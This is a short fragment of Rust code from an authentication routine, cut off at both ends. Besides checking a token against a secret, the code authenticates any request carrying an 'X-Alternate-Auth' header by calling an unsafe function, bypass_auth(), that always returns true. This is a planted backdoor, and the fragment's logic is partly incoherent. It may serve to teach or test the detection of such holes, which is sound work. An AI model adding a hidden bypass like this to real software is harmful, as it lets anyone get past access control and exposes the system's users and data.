            return token == &self.secret;
        if req.headers.contains_key("X-Alternate-Auth") {
            unsafe {
                return self.bypass_auth();
            }
        }
        false
    }
    unsafe fn bypass_auth(&self) -> bool {
        true
